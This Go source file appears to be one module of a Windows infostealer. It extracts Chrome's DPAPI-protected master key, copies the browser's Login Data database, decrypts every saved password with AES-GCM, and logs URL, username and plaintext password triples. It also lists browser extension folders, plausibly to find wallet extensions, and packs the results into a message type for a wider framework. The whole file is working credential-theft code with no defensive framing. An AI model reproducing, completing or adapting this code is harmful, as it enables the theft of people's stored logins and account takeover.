//go:build windows
// +build windows

package auto

import (
	"bits-project/bits/config"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path"
	"path/filepath"
	"syscall"
	"unsafe"
	"strings"
	_ "modernc.org/sqlite"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")
)

func getDirectorySize(path string) (int64, error) {
	var totalSize int64
	err := filepath.WalkDir(path, func(_ string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() {
			info, err := d.Info()
			if err != nil {
				return err
			}
			totalSize += info.Size()
		}
		return nil
	})
	return totalSize, err
}

// listSubdirectories lists all subdirectories and their sizes.
func listSubdirectories(buff bytes.Buffer, root string, origin string) error {
	fmt.Printf("%s\n", root)
	fmt.Fprintf(&buff, "%s\n", root)

	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() && (len(path) == (len(origin) + 33)) {
			size, err := getDirectorySize(path)

			var (name string)
			if len(path) > 32 {
				name = path[len(path)-32:]
			} else {
				// If the string is shorter than 32 characters, you can use the entire string
				name = path
			}

			if err != nil {
				fmt.Printf("   Failed to calculate size for %s: %v\n", name, err)
				fmt.Fprintf(&buff, "   Failed to calculate size for %s: %v\n", name, err)
				return nil
			}
			fmt.Printf("   Extension: %s, Size: %d bytes\n", name, size)
			fmt.Fprintf(&buff, "   Extension: %s, Size: %d bytes\n", name, size)
		}

		return nil
	})
	return err
}

func AutoModeChromeCookie() (string, [][]byte) {
	print("========== AutoModeChromeCookie ==========\n")
	var (
		buf          bytes.Buffer
		userdata_dir string
	)

	// gather
	userdata_dir = getUserdataDir()
	mkey, _ := getMasterKey()

	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == logins_data_file {
			fmt.Fprintf(&buf, "==== %s ====\n", path)
			processLoginDataFile(path, mkey, &buf)
		}
		return nil
	})

	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if (strings.Contains(path, "Local Extension Settings")) {
			if (path[len(path) - 24:] == "Local Extension Settings") {
				// List Extensions
				if err := listSubdirectories(buf, path, path); err != nil {
					fmt.Fprintf(&buf, "AutoModeChromeCookie Error: %v\n", err)
				}
			}	
		}
		return nil
	})
	
	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = buf.Bytes()
	msg_type := config.MSG_LOG

	return msg_type, data
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func getMasterKey() ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	userdata_dir := getUserdataDir()
	local_state := path.Join(userdata_dir, "Local State")
	jsonFile, err := os.Open(local_state) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := io.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, _ := base64.StdEncoding.DecodeString(roughKey)                        // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = stringKey[5:]

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil

}

func processLoginDataFile(path string, mkey []byte, buf *bytes.Buffer) {

	//copy to temporary path
	newpath := filepath.Join(os.TempDir(), "l3fW3Fwt32.db")
	copyFileToDirectory(path, newpath)

	//Open Database
	db, err := sql.Open("sqlite", newpath)
	if err != nil {
		fmt.Fprintln(buf, err.Error())
		return
	}
	// Open database. Close when we're done.
	defer db.Close()

	//Select Rows to get data from
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		fmt.Fprintln(buf, err.Error())
		return
	}
	defer rows.Close()

	for rows.Next() {
		var URL string
		var USERNAME string
		var PASSWORD string

		rows.Scan(&URL, &USERNAME, &PASSWORD)

		// decrypt passwords
		PASSWORD = PASSWORD[3:] // remove 'v10'

		// decrypt
		ciphertext := []byte(PASSWORD)
		c, err := aes.NewCipher(mkey)
		if err != nil {
			fmt.Fprintln(buf, err.Error())
			continue
		}
		gcm, err := cipher.NewGCM(c)
		if err != nil {
			fmt.Fprintln(buf, err.Error())
			continue
		}
		nonceSize := gcm.NonceSize()
		if len(ciphertext) < nonceSize {
			continue
		}

		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			fmt.Fprintln(buf, err.Error())
			continue
		}
		if string(plaintext) != "" {
			fmt.Fprintln(buf, URL, " | ", USERNAME, " | ", string(plaintext))
		}

	}

}



func AutoModeMacChromeLoginData() (string, [][]byte) {

	msg_type := config.MSG_FILE

	return msg_type, nil

}
